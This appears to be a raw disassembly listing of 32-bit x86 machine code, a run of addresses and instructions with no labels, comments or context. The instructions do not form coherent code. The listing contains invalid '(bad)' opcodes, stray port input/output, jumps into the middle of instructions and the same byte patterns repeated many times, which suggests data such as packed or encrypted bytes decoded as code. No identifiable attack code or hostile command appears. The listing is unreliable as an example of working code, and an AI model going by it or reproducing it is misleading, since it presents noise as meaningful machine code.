  425e69:	mov    dl,0x80
  425e6b:	lock mov al,BYTE PTR [eax-0x6bac7569]
  425e72:	push   ebx
  425e73:	push   ecx
  425e74:	mov    dl,0xf8
  425e76:	sub    DWORD PTR [edx-0x100f342],esi
  425e7c:	adc    BYTE PTR [edi-0x75587f76],0x53
  425e83:	jle    0x425e37
  425e85:	pop    es
  425e86:	or     al,0xed
  425e88:	(bad)  
  425e89:	or     eax,0xff29b4b2
  425e8e:	xchg   esp,eax
  425e8f:	in     al,dx
  425e90:	(bad)  
  425e91:	push   eax
  425e92:	xend   
  425e95:	dec    ebp
  425e96:	dec    ebp
  425e97:	dec    ebp
  425e98:	xor    BYTE PTR [edi-0x76],0x80
  425e9c:	lock mov ch,ch
  425e9f:	add    eax,0x29bab20d
  425ea4:	push   ebx
  425ea5:	cld    
  425ea6:	mov    dl,0x86
  425ea8:	or     al,0xff
  425eaa:	mov    dl,0x80
  425eac:	lock mov al,BYTE PTR [eax-0x3d127569]
  425eb3:	or     eax,0xf8b25153
  425eb8:	sub    DWORD PTR [edx-0x100f342],esi
  425ebe:	in     al,dx
  425ebf:	mov    dl,0x80
  425ec1:	lock mov al,BYTE PTR [eax-0x3d127569]
  425ec8:	or     eax,0xf8b25153
  425ecd:	sub    DWORD PTR [edx-0x100f342],esi
  425ed3:	add    DWORD PTR [eax],ebx
  425ed5:	push   edx
  425ed6:	dec    ebp
  425ed7:	dec    ebp
  425ed8:	dec    ebp
  425ed9:	stos   BYTE PTR es:[edi],al
  425eda:	adc    BYTE PTR [edi-0x75587f76],0xec
  425ee1:	mov    dl,0x53
  425ee3:	jle    0x425ee6
  425ee5:	lock adc DWORD PTR [eax+0x41],0x4f
  425eea:	aad    0x4d
  425eec:	dec    ebp
  425eed:	dec    ebp
  425eee:	xor    BYTE PTR [edi+0x2d],0xed
  425ef2:	(bad)  
  425ef3:	or     eax,0xb20c07b2
  425ef8:	mov    ah,0x29
  425efa:	call   DWORD PTR [ecx+eax*1-0x727277f0]
  425f01:	lea    eax,[eax-0x72c5c133]
  425f07:	lea    ebp,[edx+0x4d814d96]
  425f0d:	xchg   edi,eax
  425f0e:	and    eax,0xbdd56a4f
  425f13:	xor    BYTE PTR [edi-0x79],0x80
  425f17:	lock xor cl,BYTE PTR [ecx]
  425f1a:	inc    esi
  425f1b:	std    
  425f1c:	or     al,0xb2
  425f1e:	mov    esi,0x80b6800c
  425f23:	std    
  425f24:	xor    BYTE PTR [edi-0x79],0x80
  425f28:	xchg   edi,eax
  425f29:	xor    dl,BYTE PTR [ebx+0x72]
  425f2c:	push   ebx
  425f2d:	sub    dh,BYTE PTR [edx+0x77802984]
  425f33:	and    edi,edi
  425f35:	inc    BYTE PTR [eax+0xada6371]
  425f3b:	adc    BYTE PTR [edi-0x7faa3bab],0xc
  425f42:	and    BYTE PTR [edi-0xda707f],0x10
  425f49:	and    eax,0xc87780ef
  425f4e:	xor    al,0x8b
  425f51:	or     DWORD PTR [esi-0x3],eax
  425f54:	or     al,0xb2
  425f56:	mov    esi,0xc8f0800c
  425f5b:	and    BYTE PTR [edi+0x537c538b],0xa4
  425f62:	mov    dl,0xba
  425f64:	sub    DWORD PTR [eax+0x74ff71f0],eax
  425f6a:	in     al,dx
  425f6b:	std    
  425f6c:	xor    BYTE PTR [edi+0x21],0x80
  425f70:	sbb    eax,0x500a0063
  425f75:	lock jno 0x425f5c
  425f78:	jl     0x425f3e
  425f7a:	outs   dx,DWORD PTR ds:[esi]
  425f7b:	adc    BYTE PTR [edi+0x21778055],0x80
  425f82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f83:	xor    BYTE PTR [eax+0x50659fec],0x1d
  425f8a:	sbb    BYTE PTR ds:0x80eca680,0x2e
  425f91:	lea    ecx,[ebp+0x71f0508d]
  425f97:	and    BYTE PTR [esi+0x4381a780],0x11
  425f9e:	and    BYTE PTR [edi-0x7f00af11],0x8d
  425fa5:	and    BYTE PTR [esi-0x7fc28214],0x77
  425fac:	xchg   DWORD PTR [eax-0x10],edx
  425faf:	scas   eax,DWORD PTR es:[edi]
  425fb0:	xor    al,0x32
  425fb3:	or     DWORD PTR [esi-0x3],eax
  425fb6:	or     al,0xb2
  425fb8:	mov    esi,0x87f0800c
  425fbd:	and    BYTE PTR [edi+0x537c5332],0xa4
  425fc4:	mov    dl,0xba
  425fc6:	sub    edi,edi
  425fc8:	je     0x42601a
  425fca:	ja     0x426011
  425fcc:	xor    BYTE PTR [edi+0x71],0xbe
  425fd0:	lds    edi,FWORD PTR [edx]
  425fd2:	lea    ecx,[ebp-0x7f788880]
  425fd8:	lock xor cl,BYTE PTR [ecx]
  425fdb:	inc    esi
  425fdc:	std    
  425fdd:	or     al,0xb2
  425fdf:	mov    esi,0x87f0800c
  425fe4:	and    BYTE PTR [edi+0x29bab232],0x80
  425feb:	lock adc eax,0xa4537c53
  425ff1:	in     eax,dx
  425ff2:	mov    dl,0x8b
  425ff4:	push   DWORD PTR [esi+esi*4-0x42]
  425ff8:	arpl   WORD PTR [edx-0x72f412f7],si
  425ffe:	lea    ecx,[ebp+0x171a780]
  426004:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426005:	jae    0x425ff6
  426007:	inc    ebx
  426008:	std    
  426009:	push   eax
  42600a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42600b:	xor    eax,0x803df050
  426010:	lock test DWORD PTR [eax+0x46097a77],0x86b20cb2
  42601b:	or     al,0x80
  42601d:	ja     0x426016
  42601f:	and    BYTE PTR [edi+0x2984b27a],0x80
  426026:	ja     0x425ff0
  426028:	push   ebx
  426029:	sub    dl,BYTE PTR [ebx-0x5c]
  42602c:	call   DWORD PTR [ecx]
  42602e:	and    BYTE PTR [edi-0x7db9f675],0xc
  426035:	push   eax
  426036:	ja     0x42608d
  426038:	xor    BYTE PTR [edi-0x38],0x6e
  42603c:	out    0x55,eax
  42603e:	in     eax,dx
  42603f:	mov    dl,0xa6
  426041:	mov    dl,0xc4
  426043:	or     al,0x80
  426045:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426046:	mov    edx,DWORD PTR [ebx-0x5c]
  426049:	xor    BYTE PTR [edi+0x55b79455],ah
  42604f:	and    BYTE PTR [edi-0x740f7f38],0x9
  426056:	inc    esi
  426057:	adc    DWORD PTR [edx+esi*4],ecx
  42605a:	test   BYTE PTR [ecx],ch
  42605c:	xor    BYTE PTR [edi-0x38],0xb2
  426060:	mov    esi,0x8bf0800c
  426065:	push   ebx
  426066:	jo     0x42601a
  426068:	test   BYTE PTR [ecx],ch
  42606a:	xor    BYTE PTR [edi+0x55],0x53
  42606e:	lods   al,BYTE PTR ds:[esi]
  42606f:	jmp    DWORD PTR [eax+0x935f080]
  426075:	pop    esp
  426076:	xor    BYTE PTR [ebx+0x74],al
  426079:	xor    esi,DWORD PTR [edx+0x50f7f080]
  42607f:	ja     0x4260d6
  426081:	xor    BYTE PTR [edi+0x7a],0x9
  426085:	inc    esi
  426086:	mov    dl,0xc
  426088:	mov    dl,0x86
  42608a:	or     al,0x80
  42608c:	ja     0x426085
  42608e:	and    BYTE PTR [edi+0x2984b27a],0x80
  426095:	ja     0x4260cc
  426097:	or     DWORD PTR [ebp+ecx*4-0x33],ebx
  42609b:	add    eax,0xa6a453a7
  4260a0:	adc    ebp,ecx
  4260a2:	mov    dl,0xa6
  4260a4:	xchg   esp,eax
  4260a5:	xchg   BYTE PTR [ebx+0x70],dl
  4260a8:	xchg   BYTE PTR fs:[edi+0x36092643],cl
  4260af:	mov    dl,0xc
  4260b1:	mov    dl,0x84
  4260b3:	or     al,0x57
  4260b5:	fstp   DWORD PTR [eax-0x21]
  4260b8:	adc    DWORD PTR [ebx+0x11],edx
  4260bb:	addr16 out 0x58,al
  4260be:	fist   WORD PTR [ecx]
  4260c0:	xlat   BYTE PTR ds:[ebx]
  4260c1:	aaa    
  4260c2:	arpl   WORD PTR [ecx],dx
  4260c4:	xlat   BYTE PTR ds:[ebx]
  4260c5:	dec    esi
  4260c6:	or     BYTE PTR [eax+eax*4],0xf0
  4260ca:	jno    0x4260b8
  4260cc:	cmp    al,BYTE PTR [eax+0x65ed55f0]
  4260d2:	out    dx,eax
  4260d3:	(bad)  
  4260d4:	aad    0xe
  4260d6:	or     BYTE PTR [eax+eax*4],0xf0
  4260da:	jno    0x4260c8
  4260dc:	cmp    al,BYTE PTR [eax+0x77eceff0]
  4260e2:	push   ebp
  4260e3:	xor    BYTE PTR [eax],0x3a
  4260e6:	out    dx,eax
  4260e7:	in     eax,dx
  4260e8:	ja     0x42611f
  4260ea:	or     al,0x4d
  4260ec:	lock cmp eax,0x4d234f09
  4260f2:	dec    ebp
  4260f3:	dec    ebp
  4260f4:	les    ebp,FWORD PTR [edi]
  4260f6:	xchg   BYTE PTR fs:[edi+0x77802643],cl
  4260fd:	adc    eax,0x7c45773a
  426102:	ja     0x42616e
  426104:	rcr    BYTE PTR [eax-0x21],1
  426107:	adc    DWORD PTR [eax-0x59],edx
  42610a:	jbe    0x42608c
  42610c:	ja     0x426178
  42610e:	xor    al,0x76
  426111:	or     DWORD PTR [esi-0x3],eax
  426114:	or     al,0xb2
  426116:	mov    esi,0x6af0800c
  42611b:	and    BYTE PTR [edi+0x29bab276],0x80
  426122:	lock and DWORD PTR [eax+0x537c5330],eax
  426129:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42612a:	push   DWORD PTR [ecx+eax*1+0x75]
  42612e:	mov    dl,0xe5
  426130:	xor    al,0x45
  426133:	arpl   di,bp
  426135:	rcl    DWORD PTR [ebp-0x80],cl
  426138:	ja     0x4261ab
  42613a:	in     al,dx
  42613b:	ja     0x426152
  42613d:	push   eax
  42613e:	ja     0x4261b1
  426140:	sub    BYTE PTR [ebp-0x12],0x50
  426144:	ja     0x42615b
  426146:	xor    BYTE PTR [edi-0x79],0x80
  42614a:	lock xor cl,BYTE PTR [ecx]
  42614d:	inc    esi
  42614e:	std    
  42614f:	or     al,0xb2
  426151:	mov    esi,0x87f0800c
  426156:	and    BYTE PTR [edi+0x53a45332],0x7c
  42615d:	push   DWORD PTR [edx+esi*4-0x46]
  426161:	sub    DWORD PTR [edi+0x77],ebx
  426164:	adc    eax,0xdbf4f09
  426169:	dec    ebp
  42616a:	dec    ebp
  42616b:	xor    al,0x8a
  42616e:	adc    BYTE PTR [edi-0x4daeac76],0xbe
  426175:	or     al,0xe2
  426177:	or     eax,0xb2f7539d
  42617c:	clc    
  42617d:	sub    edi,edi
  42617f:	inc    BYTE PTR [eax-0x587f7569]
  426185:	mov    dl,BYTE PTR [ebx+0x7e]
  426188:	mov    dl,0x7
  42618a:	or     al,0x53
  42618c:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  426193:	inc    BYTE PTR [eax-0x587f7569]
  426199:	mov    dl,BYTE PTR [ebx+0x7e]
  42619c:	mov    dl,0x7
  42619e:	or     al,0x53
  4261a0:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  4261a7:	inc    BYTE PTR [eax-0x587f7569]
  4261ad:	mov    dl,BYTE PTR [ebx+0x7e]
  4261b0:	push   ebx
  4261b1:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  4261b8:	call   DWORD PTR [esp+ebp*8+0x520150fe]
  4261bf:	dec    ebp
  4261c0:	dec    ebp
  4261c1:	dec    ebp
  4261c2:	xor    al,0x81
  4261c5:	adc    BYTE PTR [edi-0x79587f7a],0x53
  4261cc:	jle    0x426221
  4261ce:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  4261d5:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  4261dc:	dec    ebp
  4261dd:	dec    ebp
  4261de:	xor    al,0x21
  4261e1:	xor    BYTE PTR [eax],0x80
  4261e4:	xchg   edi,eax
  4261e5:	mov    al,BYTE PTR [eax+0x7f808aa7]
  4261eb:	or     dl,BYTE PTR [ebx+0x7e]
  4261ee:	push   ebx
  4261ef:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  4261f6:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  4261fd:	dec    ebp
  4261fe:	dec    ebp
  4261ff:	xor    al,0x1d
  426202:	adc    BYTE PTR [edi-0x4d08ace3],0xf8
  426209:	sub    DWORD PTR [ebx+0x51],edx
  42620c:	mov    dl,0xbe
  42620e:	or     al,0xff
  426210:	inc    BYTE PTR [eax-0x587f7569]
  426216:	mov    dl,BYTE PTR [ebx-0x7e]
  426219:	xor    BYTE PTR [edi-0x76],0x53
  42621d:	jle    0x4261d1
  42621f:	mov    ah,0x29
  426221:	mov    dl,0x7
  426223:	or     al,0xff
  426225:	xchg   esp,eax
  426226:	and    BYTE PTR [edi-0x1203ac76],0xc6
  42622d:	or     eax,0xb20c86b2
  426232:	mov    ah,0x29
  426234:	push   DWORD PTR [esp+ebp*8-0x9]
  426238:	push   eax
  426239:	inc    ecx
  42623a:	sbb    ch,dl
  42623c:	dec    ebp
  42623d:	dec    ebp
  42623e:	dec    ebp
  42623f:	xor    al,0x8a
  426242:	adc    BYTE PTR [edi-0x4daeac76],0xbe
  426249:	or     al,0xe2
  42624b:	or     eax,0xb2f7539d
  426250:	clc    
  426251:	sub    edi,edi
  426253:	inc    BYTE PTR [eax-0x587f7569]
  426259:	mov    dl,BYTE PTR [ebx+0x7e]
  42625c:	mov    dl,0x7
  42625e:	or     al,0x53
  426260:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  426267:	inc    BYTE PTR [eax-0x587f7569]
  42626d:	mov    dl,BYTE PTR [ebx+0x7e]
  426270:	mov    dl,0x7
  426272:	or     al,0x53
  426274:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  42627b:	inc    BYTE PTR [ecx]
  42627d:	xchg   edi,eax
  42627e:	adc    DWORD PTR [eax+0x16],0x1
  426282:	aad    0x4d
  426284:	dec    ebp
  426285:	dec    ebp
  426286:	add    DWORD PTR [ecx],eax
  426288:	push   edx
  426289:	dec    ebp
  42628a:	dec    ebp
  42628b:	dec    ebp
  42628c:	xchg   esi,eax
  42628d:	xor    al,0x8a
  426290:	adc    BYTE PTR [edi-0x7faeac76],0xd7
  426297:	sub    eax,0xbeb2f753
  42629c:	or     al,0xb2
  42629e:	clc    
  42629f:	sub    edi,edi
  4262a1:	(bad)  
  4262a2:	xchg   esi,eax
  4262a3:	add    DWORD PTR [eax+ecx*4-0x73],ecx
  4262a7:	lea    ecx,[ebp+0x3e4c800a]
  4262ad:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  4262b3:	xchg   edi,eax
  4262b4:	and    eax,0x3acd4c80
  4262b9:	lea    ecx,[ebp-0x7fde88b0]
  4262bf:	ja     0x4262b0
  4262c1:	sub    bh,0xec
  4262c4:	lock and DWORD PTR [eax-0x10],edx
  4262c8:	and    DWORD PTR [eax-0x687f3710],eax
  4262ce:	mov    ecx,DWORD PTR [ecx]
  4262d0:	inc    esi
  4262d1:	mov    dh,0xc
  4262d3:	mov    dl,0x7
  4262d5:	or     al,0x80
  4262d7:	xchg   edi,eax
  4262d8:	enter  0xd780,0x8b
  4262dc:	push   ebx
  4262dd:	or     esi,DWORD PTR [edx-0x687fd608]
  4262e3:	enter  0x2a53,0xff
  4262e7:	push   ecx
  4262e8:	adc    bh,0x8b
  4262eb:	or     DWORD PTR [esi-0x3e],eax
  4262ee:	or     al,0xb2
  4262f0:	mov    BYTE PTR [eax+eax*4],cl
  4262f3:	xlat   BYTE PTR ds:[ebx]
  4262f4:	enter  0xa780,0x8b
  4262f8:	push   ebx
  4262f9:	pushf  
  4262fa:	push   ebx
  4262fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4262fc:	call   DWORD PTR [esp+ebp*8-0x37687f02]
  426303:	mov    dl,0x2
  426305:	sub    DWORD PTR [eax+0x46098bd7],eax
  42630b:	ret    0xb20c
  42630e:	mov    BYTE PTR [eax+eax*4],cl
  426311:	xlat   BYTE PTR ds:[ebx]
  426312:	enter  0xa780,0x8b
  426316:	push   ebx
  426317:	pushf  
  426318:	push   ebx
  426319:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42631a:	call   DWORD PTR [esp+ebp*8-0x37687f02]
  426321:	mov    dl,0x2
  426323:	sub    DWORD PTR [eax+0x46098bd7],eax
  426329:	ret    0xb20c
  42632c:	mov    BYTE PTR [eax+eax*4],cl
  42632f:	xlat   BYTE PTR ds:[ebx]
  426330:	enter  0x9c53,0x80
  426334:	out    0x8b,eax
  426336:	push   ebx
  426337:	dec    ebp
  426338:	call   FWORD PTR [esp+ebp*8+0x4d0a96fe]
  42633f:	xlat   BYTE PTR ds:[ebx]
  426340:	and    DWORD PTR [edx-0x6979d6fe],esi
  426346:	xchg   DWORD PTR [ebp+0x4d],ecx
  426349:	xor    BYTE PTR [edi-0x51],0xab
  42634d:	test   eax,0x81fb70a3
  426352:	lea    edx,[edi-0x78127880]
  426358:	inc    ebp
  426359:	xchg   ebx,eax
  42635a:	cdq    
  42635b:	fwait
  42635c:	push   ebx
  42635d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42635e:	push   ebx
  42635f:	jo     0x4263dd
  426361:	ja     0x4262e5
  426363:	fstp   DWORD PTR [eax-0x21]
  426366:	adc    DWORD PTR [esi-0x7a],ebx
  426369:	pop    DWORD PTR [ebx+0x26]
  42636c:	push   eax
  42636d:	ja     0x4262f2
  42636f:	jl     0x4263e8
  426371:	xchg   ah,ah
  426373:	pop    eax
  426374:	fist   WORD PTR [ecx]
  426376:	push   eax
  426377:	ja     0x426300
  426379:	jl     0x4263f2
  42637b:	xchg   esi,esi
  42637d:	mov    ds:0x777c386f,eax
  426382:	enter  0xe9f6,0x6f
  426386:	cmp    BYTE PTR [edi+esi*2+0x32],bh
  42638a:	cli    
  42638b:	and    al,0x6f
  42638d:	cmp    BYTE PTR [edi+esi*2+0x32],bh
  426391:	hlt    
  426392:	and    al,0x6f
  426394:	cmp    BYTE PTR [edi+esi*2-0x75],bh
  426398:	mul    BYTE PTR [esi+ebp*8]
  42639b:	cmp    BYTE PTR [ecx],al
  42639d:	ja     0x42638d
  42639f:	push   eax
  4263a0:	ja     0x42632d
  4263a2:	xor    BYTE PTR [edi+0x1d],0x80
  4263a6:	bound  esi,QWORD PTR [esi]
  4263a8:	cmp    cl,BYTE PTR [ebp+0x1d77808d]
  4263ae:	xor    al,0x1d
  4263b1:	or     ch,0x2e
  4263b4:	cmp    cl,BYTE PTR [ebp-0x7f8e7f73]
  4263ba:	pop    ebp
  4263bb:	in     al,dx
  4263bc:	out    0x65,al
  4263be:	adc    BYTE PTR [edi+0x26508082],0x3a
  4263c5:	lea    ecx,[ebp-0x7f0618b0]
  4263cb:	out    0x83,eax
  4263cd:	or     DWORD PTR [esi-0x7b],eax
  4263d0:	or     al,0xb2
  4263d2:	popa   
  4263d3:	or     al,0x80
  4263d5:	out    0x82,eax
  4263d7:	and    BYTE PTR [edi-0x583d5d7d],0xc7
  4263de:	add    al,0xd4
  4263e0:	push   ebx
  4263e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263e2:	mov    dl,0xbc
  4263e4:	sub    DWORD PTR [eax+0x6394ff5f],eax
  4263ea:	pushf  
  4263eb:	xlat   BYTE PTR ds:[ebx]
  4263ec:	push   edx
  4263ed:	sbb    BYTE PTR [ecx],0x50
  4263f0:	xchg   edi,eax
  4263f1:	mov    eax,DWORD PTR [eax-0x687fea69]
  4263f7:	jno    0x426379
  4263f9:	xchg   edi,eax
  4263fa:	and    DWORD PTR [ecx],eax
  4263fc:	xchg   edi,eax
  4263fd:	test   BYTE PTR [edx-0x697428b3],ch
  426403:	or     bl,BYTE PTR [ecx+0x11dd74d]
  426409:	ja     0x426404
  42640b:	dec    ebp
  42640c:	xlat   BYTE PTR ds:[ebx]
  42640d:	out    dx,eax
  42640e:	dec    ebp
  42640f:	xlat   BYTE PTR ds:[ebx]
  426410:	enter  0xd74d,0x32
  426414:	dec    ebp
  426415:	xlat   BYTE PTR ds:[ebx]
  426416:	xchg   DWORD PTR [edx],ecx
  426418:	add    DWORD PTR [edi-0x76],esi
  42641b:	or     al,BYTE PTR [esi+0x4d4d4bab]
  426421:	push   eax
  426422:	ja     0x426441
  426424:	xor    BYTE PTR [edi+0x1d],0x80
  426428:	lock and eax,0x80159250
  42642e:	ja     0x426455
  426430:	jl     0x4263bf
  426432:	in     al,dx
  426433:	lea    ecx,[ebp-0x7b887f73]
  426439:	xor    al,0x25
  42643c:	push   eax
  42643d:	xchg   edx,eax
  42643e:	out    dx,al
  42643f:	xor    BYTE PTR [edi+0x71],0x80
  426443:	lock and eax,0x80ef9250
  426449:	ja     0x426460
  42644b:	xor    al,0x25
  42644e:	push   eax
  42644f:	xchg   edx,eax
  426450:	and    DWORD PTR [eax+0x6d7c2577],eax
  426456:	and    eax,0x8d8d8d3a
  42645b:	les    ebx,FWORD PTR [edi]
  42645d:	xor    BYTE PTR [edi+0x1d],0x80
  426461:	lock sbb eax,0x3a2ecd80
  426467:	lea    ecx,[ebp+0x3a265080]
  42646d:	lea    ecx,[ebp+0x3a438d80]
  426473:	push   eax
  426474:	ja     0x426400
  426476:	xor    BYTE PTR [edi-0x76],0xab
  42647a:	test   eax,0x1dfb70a3
  42647f:	lea    edx,[edi+0x77808780]
  426485:	and    DWORD PTR [edx-0x72c5c179],esp
  42648b:	lea    edx,[ebx-0x9986467]
  426491:	and    al,0x6f
  426493:	cmp    BYTE PTR [ecx],cl
  426495:	dec    edi
  426496:	mov    esi,0x808d8da6
  42649b:	ja     0x42650e
  42649d:	addr16 cmc 
  42649f:	and    al,0x6f
  4264a1:	cmp    BYTE PTR [ecx],cl
  4264a3:	dec    edi
  4264a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4264a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4264a6:	lea    ecx,[ebp-0x26788884]
  4264ac:	pop    eax
  4264ad:	fist   WORD PTR [ecx]
  4264af:	pop    esi
  4264b0:	xchg   BYTE PTR [edi+0x77502643],cl
  4264b6:	xor    bh,BYTE PTR [edi+esi*2-0x7]
  4264ba:	in     al,0x58
  4264bc:	fist   WORD PTR [ecx]
  4264be:	push   eax
  4264bf:	ja     0x426447
  4264c1:	xor    BYTE PTR [edi-0x11],0x50
  4264c5:	ja     0x42648f
  4264c7:	xor    BYTE PTR [edi-0x38],0x80
  4264cb:	int    0x86
  4264cd:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  4264d3:	lea    edx,[eax+0x77]
  4264d6:	mov    esp,DWORD PTR [eax+0x7f]
  4264d9:	cmp    BYTE PTR [ebp+0x38975e8d],cl
  4264df:	lea    ecx,[ebp+0x5a7750b9]
  4264e5:	in     eax,dx
  4264e6:	push   0xd
  4264e8:	mov    ecx,0x80d17750
  4264ed:	mov    dl,0xb9
  4264ef:	push   eax
  4264f0:	ja     0x426508
  4264f2:	pop    esi
  4264f3:	int3   
  4264f4:	cmp    BYTE PTR [ebp-0x46087f73],cl
  4264fa:	push   eax
  4264fb:	xchg   edi,eax
  4264fc:	loope  0x4264ff
  4264fe:	push   edx
  4264ff:	or     al,0x1
  426501:	lahf   
  426502:	stos   BYTE PTR es:[edi],al
  426503:	cmp    BYTE PTR [esi-0x47],0x50
  426507:	xchg   edi,eax
  426508:	push   ds
  426509:	adc    BYTE PTR [ecx+edi*4-0x121668b0],0xfb
  426511:	jle    0x4264cc
  426513:	push   eax
  426514:	xchg   edi,eax
  426515:	int    0x1
  426517:	xchg   esi,eax
  426518:	push   ebp
  426519:	add    BYTE PTR [ebp-0x1518af47],0xed
  426520:	jl     0x42659c
  426522:	mov    ecx,0x10fe750
  426527:	fistp  WORD PTR [ecx-0x47]
  42652a:	push   eax
  42652b:	out    0x4c,eax
  42652d:	mov    ecx,0xb9107750
  426532:	push   eax
  426533:	xlat   BYTE PTR ds:[ebx]
  426534:	pop    DWORD PTR [eax+0x7750b974]
  42653a:	inc    ecx
  42653b:	mov    ecx,0x4d6d1850
  426540:	dec    ebp
  426541:	dec    ebp
  426542:	in     eax,dx
  426543:	push   0x62
  426545:	mov    ecx,0x4dd84f50
  42654a:	dec    ebp
  42654b:	dec    ebp
  42654c:	add    DWORD PTR [edx+0x4f50b985],edx
  426552:	jne    0x4265a1
  426554:	dec    ebp
  426555:	dec    ebp
  426556:	in     eax,dx
  426557:	push   0xffffffd4
  426559:	mov    ecx,0x4d794f50
  42655e:	dec    ebp
  42655f:	dec    ebp
  426560:	add    DWORD PTR [edx+0x4f50b971],edx
  426566:	jge    0x4265b5
  426568:	dec    ebp
  426569:	dec    ebp
  42656a:	in     eax,dx
  42656b:	push   0xffffffc0
  42656d:	mov    ecx,0x4dda4f50
  426572:	dec    ebp
  426573:	dec    ebp
  426574:	mov    ecx,0x4d310150
  426579:	dec    ebp
  42657a:	dec    ebp
  42657b:	xor    BYTE PTR [ecx+edi*4+0x50],0x4f
  426580:	mov    cl,0x4d
  426582:	dec    ebp
  426583:	dec    ebp
  426584:	xor    BYTE PTR [edi-0x79],0x80
  426588:	lock xor cl,BYTE PTR [ecx]
  42658b:	inc    esi
  42658c:	std    
  42658d:	or     al,0xb2
  42658f:	mov    esi,0x87f0800c
  426594:	adc    BYTE PTR [edi-0x385893ce],0x4
  42659b:	aam    0x53
  42659d:	jl     0x4265f2
  42659f:	jb     0x426553
  4265a1:	mov    edx,0xc4fbff29
  4265a6:	xchg   edx,eax
  4265a7:	add    ebp,edx
  4265a9:	ja     0x426605
  4265ab:	mov    ecx,0x5c09a180
  4265b0:	sbb    DWORD PTR [ecx],ecx
  4265b2:	pop    esp
  4265b3:	jo     0x426608
  4265b5:	adc    DWORD PTR [edx-0x72c7163e],esp
  4265bb:	lea    esi,[esi+0x9bab207]
  4265c1:	(bad)  
  4265c2:	(bad)  
  4265c3:	adc    BYTE PTR [ecx+0x2f],al
  4265c6:	or     DWORD PTR ds:0xf0804d4d,0xfffffff9
  4265cd:	adc    BYTE PTR [edi-0x49b9f67a],0xc
  4265d4:	mov    dl,0x7
  4265d6:	or     al,0x80
  4265d8:	xchg   edi,eax
  4265d9:	stc    
  4265da:	adc    bh,0x86
  4265dd:	push   ebx
  4265de:	sub    dl,BYTE PTR [ebx+0xb]
  4265e1:	call   DWORD PTR [ecx-0x4e]
  4265e4:	clc    
  4265e5:	sub    esp,ebp
  4265e7:	mov    dl,0xed
  4265e9:	mov    ebp,DWORD PTR [edi-0x29]
  4265ec:	icebp  
  4265ed:	xor    BYTE PTR [edi-0x79],0x80
  4265f1:	lock xor cl,BYTE PTR [ecx]
  4265f4:	inc    esi
  4265f5:	std    
  4265f6:	or     al,0xb2
  4265f8:	mov    esi,0x87f0800c
  4265fd:	adc    BYTE PTR [edi+0x537c5332],0x72
  426604:	mov    dl,0xba
  426606:	sub    edi,edi
  426608:	sti    
  426609:	les    edx,FWORD PTR [edx-0x32882aff]
  42660f:	mov    ecx,0x5c09a180
  426614:	sbb    DWORD PTR [ecx],ecx
  426616:	pop    esp
  426617:	jo     0x42666c
  426619:	adc    DWORD PTR [edx-0x72c7163e],esp
  42661f:	lea    esi,[esi+0x9bab207]
  426625:	(bad)  
  426626:	(bad)  
  426627:	adc    BYTE PTR [ecx+0x2f],al
  42662a:	inc    ecx
  42662b:	or     eax,0xf0804d4d
  426630:	stc    
  426631:	adc    BYTE PTR [edi-0x49b9f67a],0xc
  426638:	mov    dl,0x7
  42663a:	or     al,0x80
  42663c:	xchg   edi,eax
  42663d:	stc    
  42663e:	adc    bh,0x86
  426641:	push   ebx
  426642:	sub    dl,BYTE PTR [ebx+0xb]
  426645:	call   DWORD PTR [ecx-0x4e]
  426648:	clc    
  426649:	sub    esp,ebp
  42664b:	mov    dl,0xed
  42664d:	mov    ecx,DWORD PTR [edi+edx*8-0x78887f0f]
  426654:	xor    al,0x32
  426657:	or     DWORD PTR [esi-0x3],eax
  42665a:	or     al,0xb2
  42665c:	mov    esi,0x87f0800c
  426661:	adc    BYTE PTR [edi+0x537c5332],0x72
  426668:	mov    dl,0xba
  42666a:	sub    edi,edi
  42666c:	sti    
  42666d:	les    esi,FWORD PTR [ebp+0x1]
  426670:	push   esi
  426671:	ja     0x4266e0
  426673:	dec    ebp
  426674:	dec    ebp
  426675:	dec    ebp
  426676:	mov    ecx,0x5c09a180
  42667b:	sbb    DWORD PTR [ecx],ecx
  42667d:	pop    esp
  42667e:	jo     0x4266d3
  426680:	adc    DWORD PTR [edx-0x72c7163e],esp
  426686:	lea    esi,[esi+0x9bab207]
  42668c:	(bad)  
  42668d:	(bad)  
  42668e:	adc    BYTE PTR [ecx+0x2f],al
  426691:	prefetchw BYTE PTR [ebp+0x4d]
  426695:	xor    al,0xf9
  426698:	adc    BYTE PTR [edi-0x49b9f67a],0xc
  42669f:	mov    dl,0x7
  4266a1:	or     al,0x80
  4266a3:	xchg   edi,eax
  4266a4:	stc    
  4266a5:	adc    bh,0x86
  4266a8:	push   ebx
  4266a9:	sub    dl,BYTE PTR [ebx+0xb]
  4266ac:	call   DWORD PTR [ecx-0x4e]
  4266af:	clc    
  4266b0:	sub    esp,ebp
  4266b2:	mov    dl,0xed
  4266b4:	mov    ebp,edi
  4266b6:	xlat   BYTE PTR ds:[ebx]
  4266b7:	pop    esp
  4266b8:	add    DWORD PTR [edi-0x7],ecx
  4266bb:	or     eax,0x77504d4d
  4266c0:	mov    eax,DWORD PTR [eax+0x49608b77]
  4266c6:	cmp    eax,0xef50d146
  4266cb:	icebp  
  4266cc:	outs   dx,BYTE PTR ds:[esi]
  4266cd:	sub    ecx,DWORD PTR [ebx]
  4266cf:	sub    BYTE PTR [eax+0xa],dl
  4266d2:	out    dx,al
